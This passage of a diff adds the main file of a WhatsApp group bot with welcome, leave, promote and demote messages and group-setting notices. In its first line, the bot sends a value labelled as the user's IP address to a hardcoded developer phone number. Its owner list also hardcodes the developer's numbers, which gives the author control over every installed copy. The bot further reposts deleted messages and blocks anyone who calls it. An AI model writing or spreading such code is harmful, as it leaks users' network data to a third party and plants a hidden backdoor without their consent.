+       denz.sendMessage("6281803609324@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
+     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
+   })
+      
+    denz.on('connecting', () => {
+		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
+		})
+	
+	denz.on('open', () => {
+	console.log(color('|TRM|'), color('Connected', 'cyan'))
+	}) 
+     
+    denz.on('ws-close', () => {
+        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
+        })
+    
+    denz.on('close', async () => {
+        console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
+        })
+    
+	if (!settings.autoplaymusic) {
+exec(`cd /sdcard/download && play *mp3`)
+}
+   
+   denz.on('chat-update', async (mek) => {
+        require('./denz.js')(denz, mek)
+        ownerNumber = ["6285866295942@s.whatsapp.net","6281337541779@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "6285866295942@s.whatsapp.net"
+       otod = `${settings.NomorOwner}@s.whatsapp.net`
+    })   
+        denz.on('group-participants-update', async (anu) => {
+           mem = anu.participants[0]
+           const uwu = '```'
+const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
+kma = gam1
+mhan = await denz.prepareMessage(mdata.id, kma, MessageType.location)
+const buttonMessages = {
+locationMessage: mhan.message.locationMessage,
+contentText: text1,
+footerText: desc1,
+buttons: but,
+headerType: 6
+}
+denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
+}
+			const mdata = await denz.groupMetadata(anu.jid)
+		    try {
+			console.log(anu)
+			if (anu.action == 'add') {
+			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
+        	if(!welkom.includes(mdata.id)) return
+			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+		    num = anu.participants[0]
+			try {
+			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
+			} catch {
+			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+			}
+			let buff = await getBuffer(ppimg)
+			masuk =`Halo @${num.split('@')[0]}
+Selamat Datang Di ${mdata.subject}
+
+*Jangan Lupa Isi*
+*Nama* :
+*Umur* :
+*Gender* :
+*Askot* :
+
+Enjoy Jangan Lupa Kenalan
+Klik Button Di Bawah Untuk Memulai Bot
+Note Jika Tidak Ada Ketik .allmenu`
+gbutsan = [
+{buttonId:`inibuatwelcome`,buttonText:{displayText:'👋Welcome'},type:1},
+{buttonId:`menu`,buttonText:{displayText:'📒MENU'},type:1},
+{buttonId:`owner`,buttonText:{displayText:'👑OWNER'},type:1}
+]
+mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
+const buttonMessages = {
+imageMessage: mhan.message.imageMessage,
+contentText: `${masuk}`,
+footerText: `Welcome  Information`, 
+buttons: gbutsan,
+headerType: 4
+}
+denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
+        thumbnail: fs.readFileSync('./denz.jpg'),
+        "contextInfo": {
+            mentionedJid: [num]},
+        caption: 'Tes',
+            quoted: fkontakk})
+            //sendButLocation(mdata.id, `${masuk}`, `${uwu}Y U Z Z U 右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'HALLO'},type:1}], {contextInfo: { mentionedJid: [num]}})
+			} else if (anu.action == 'remove') {
+			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
+        	if(!welkom.includes(mdata.id)) return
+			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+			num = anu.participants[0]
+			try {
+			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
+			} catch {
+			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+			}
+			let buff = await getBuffer(ppimg)
+			keluar =`Selamat tinggal @${num.split('@')[0]}\nSemoga tentang disana`
+gbutsan = [
+{buttonId:`inibuatout`,buttonText:{displayText:'👋Byee'},type:1}
+]
+mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
+const buttonMessages = {
+imageMessage: mhan.message.imageMessage,
+contentText: `${keluar}`,
+footerText: `Leave Information`,
+buttons: gbutsan,
+headerType: 4
+}
+denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
+        thumbnail: fs.readFileSync('./denz.jpg'),
+        "contextInfo": {
+            mentionedJid: [num]},
+        caption: 'Tes',
+            quoted: fkontakk})
+            //sendButLocation(mdata.id, `${keluar}`, `${uwu}Y U Z Z U 右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'BYEE'},type:1}], {contextInfo: { mentionedJid: [num]}})
+			} else if (anu.action == 'promote') {
+fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+num = anu.participants[0]
+teks = `*P R O M O T E - D E T E C T E D*\n Username: @${num.split('@')[0]}\n Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n Group: ${mdata.subject}`
+denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
+console.log(color('|TRM|'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
+} 
+else if (anu.action == 'demote') {
+fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+num = anu.participants[0]
+teks = `*D E M O T E - D E T E C T E D*\n Username: @${num.split('@')[0]}\n Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n Group: ${mdata.subject}`
+denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
+console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
+}
+		    } catch (e) {
+			console.log('Error : %s', color(e, 'red'))
+		    }
+	        })	       
+	denz.on('group-update', async (anu) => {
+		const metdata = await denz.groupMetadata(anu.jid)
+    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+    if(anu.announce == 'false'){
+    teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
+  } 
+  else if(anu.announce == 'true'){
+    teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
+  }
+  else if(!anu.desc == ''){
+    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
+    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
+  }
+  else if(anu.restrict == 'false'){
+    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
+  }
+  else if(anu.restrict == 'true'){
+    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
+  }
+})
+
+denz.on('CB:action,,call', async json => {
+        const callerId = json[2][0][1].from;
+        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
+        denz.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
+        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:`https://wa.me/6285866295942?text=Assalamualaikum`}}})
+        await sleep(5000)
+        await denz.blockUser(callerId, "add")
+        })
+        
+	denz.on('message-delete', async (m) => {
+if (m.key.remoteJid == 'status@broadcast') return
+if (!m.key.fromMe) {
+m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
+const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
+let d = new Date
+let c = denz.chats.get(m.key.remoteJid)
+let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
+let co3ntent = denz.generateForwardMessageContent(a, false)
+let c3type = Object.keys(co3ntent)[0]
+let locale = 'id'
+let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
+let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
+let week = d.toLocaleDateString(locale, { weekday: 'long' })
+let calender = d.toLocaleDateString(locale, {
+day: 'numeric',
+month: 'long',
+year: 'numeric'
+})
+denz.copyNForward(m.key.remoteJid, m.message)
+denz.sendMessage(m.key.remoteJid, `▷\`\`\`Anti Delete\`\`\`
+
+▢ \`\`\`Nama : @${m.participant.split("@")[0]}\`\`\`
+▢ \`\`\`Tipe : ${c3type}\`\`\`
+▢ \`\`\`Tanggal : ${jam} - ${week} ${weton} - ${calender}\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
+}
+})
+}
+
+console.clear()
+var progressBar , progress = 0 ;
+function doProgress()
+{
+	progress += Math.random() / 10 ;
+	progressBar.update( progress ) ;
+	
+	if ( progress >= 1 )
+	{
+		setTimeout( function() { console.clear(),
+		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
+			console.log(stdout), console.log(bgcolor('https://github.com/dcode-denpa/bitch-boot', 'cyan'))})}, 200 ) ;
+	}
+	else
+	{
+		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
+	}
+}
+console.log(color(figlet.textSync(`${settings.NamaBot}`, {
+		font: 'Standard',
+		horizontalLayout: 'default',
+		vertivalLayout: 'default',
+		width: 80,
+		whitespaceBreak: true
+	    }), 'lightgreen')), term.slowTyping(' Created By Denis Putra' ,{ flashStyle: term.brightWhite })
+progressBar = term.progressBar( {
+	width: 80 ,
+	title: '\n\nLoading' ,
+	eta: true ,
+	percent: true
+} ) ;
+doProgress() ;
+
+/**
+ * Uncache if there is file change
+ * @param {string} module Module name or path
+ * @param {function} cb <optional> 
+ */
+function nocache(module, cb = () => { }) {
+    fs.watchFile(require.resolve(module), async () => {
+        await uncache(require.resolve(module))
+        cb(module)
+    })
+}
+/**
+ * Uncache a module
+ * @param {string} module Module name or path
+ */
+function uncache(module = '.') {
+    return new Promise((resolve, reject) => {
+        try {
+            delete require.cache[require.resolve(module)]
+            resolve()
+        } catch (e) {
+            reject(e)
+        }
+    })
+}
+starts()
